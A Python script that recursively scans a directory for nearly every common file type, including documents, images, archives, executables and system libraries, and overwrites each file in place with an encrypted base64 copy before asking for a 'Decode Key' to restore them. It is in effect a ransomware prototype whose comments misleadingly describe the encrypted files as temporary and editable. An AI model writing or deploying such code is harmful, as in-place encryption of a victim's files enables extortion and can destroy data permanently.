import base64
import os
from encryptor import *

def read_file(file_path):
    """Read the binary content of a file."""
    with open(file_path, 'rb') as file:
        return file.read()

def write_file(file_path, data):
    """Write binary data to a file."""
    with open(file_path, 'wb') as file:
        file.write(data)

def encode_to_base64(binary_data):
    """Encode binary data to Base64."""
    return base64.b64encode(binary_data).decode('utf-8')

def decode_from_base64(base64_data):
    """Decode Base64 data back to binary."""
    return base64.b64decode(base64_data.encode('utf-8'))

def is_editable_file(file_path):
    """Check if the file is potentially editable (e.g., by extension)."""
    # Example of editable file extensions; adjust as needed
    editable_extensions = [
    # Documents
    '.txt', '.doc', '.docx', '.pdf', '.rtf', '.odt', '.wps', '.html', '.htm',

    # Spreadsheets
    '.xls', '.xlsx', '.csv', '.ods',

    # Presentations
    '.ppt', '.pptx', '.odp',

    # Images
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.svg', '.webp',

    # Audio
    '.mp3', '.wav', '.ogg', '.flac', '.aac', '.m4a',

    # Video
    '.mp4', '.avi', '.mov', '.mkv', '.webm', '.wmv', '.flv', '.mpg', '.mpeg',

    # Archives
    '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',

    # Executables
    '.exe', '.bat', '.sh', '.msi', '.app', '.apk',

    # System and Config Files
    '.ini', '.cfg', '.log', '.sys', '.dll', '.so', '.dat',

    # Code Files
    '.py', '.java', '.cpp', '.c', '.js', '.html', '.css', '.php', '.rb',

    # Fonts
    '.ttf', '.otf', '.woff', '.woff2',

    # Miscellaneous
    '.md', '.json', '.xml', '.yaml', '.svg'
    ]
    _, ext = os.path.splitext(file_path)
    return ext.lower() in editable_extensions

def scan_for_files(directory):
    """Scan the directory and subdirectories for editable files."""
    editable_files = []
    for root, dirs, files in os.walk(directory):
        for filename in files:
            file_path = os.path.join(root, filename)
            if is_editable_file(file_path):
                editable_files.append(file_path)
    return editable_files

def process_file(file_path):
    """Process the file: decode, wait for user input, and restore."""
    print(f"Processing file: {file_path}")
    
    # Step 1: Read the original binary content
    original_binary_data = read_file(file_path)

    # Step 2: Encode binary data to Base64
    base64_data = encode_to_base64(original_binary_data)
    
    base64_data_encrypt = encrypt("Test", base64_data)

    # Step 3: Save Base64 to a temporary file (for user modification)
    write_file(file_path, base64_data_encrypt.encode('utf-8'))

    print(f"Base64 encoded content saved to {file_path}")
    
def decode_file(file_path, key):

    # Step 5: Read the modified Base64 content
    modified_base64_data = read_file(file_path).decode('utf-8')
    
    modified_base64_data_changed = decrypt(key, modified_base64_data)
    # Step 6: Decode Base64 data back to binary
    try:
        modified_binary_data = decode_from_base64(modified_base64_data_changed)
    except Exception as e:
        print(f"Error decoding modified Base64 data: {e}")
        return

    # Step 7: Save the binary data to the original file (overwriting)
    write_file(file_path, modified_binary_data)

    print(f"File restored to its original binary format: {file_path}")

def main(directory_to_scan):
    """Main function to scan and process editable files in the specified directory."""
    files_to_process = scan_for_files(directory_to_scan)
    
    if not files_to_process:
        print("No editable files found.")
        return

    for file_path in files_to_process:
        process_file(file_path)
        
    key = input("Enter Decode Key: \n")
    for file_path in files_to_process:
        decode_file(file_path, key)

# Example usage
directory_to_scan = 'C:/Users/Asus/Downloads/Tea'
main(directory_to_scan)
